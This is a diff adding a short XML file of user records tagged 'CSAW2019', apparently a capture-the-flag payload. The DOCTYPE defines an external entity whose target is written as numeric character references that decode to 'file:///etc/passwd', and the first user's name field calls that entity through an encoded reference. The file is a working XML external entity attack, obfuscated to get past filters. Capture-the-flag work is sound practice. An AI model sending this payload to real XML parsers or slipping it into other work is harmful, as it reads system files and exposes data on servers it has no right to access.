@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE my PUBLIC "" "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;">
+<users>
+   <user>
+      <username>parser</username>
+      <password>breaks</password>
+      <name>&amp;&#109;&#121;&#59;</name>
+      <email>why@os.com</email>
+      <group>CSAW2019</group>
+   </user>
+   <user>
+      <username>bob</username>
+      <password>passwd2</password>
+      <name>Bob</name>
+      <email>bob@fakesite.com</email>
+      <group>CSAW2019</group>
+   </user>
+</users>
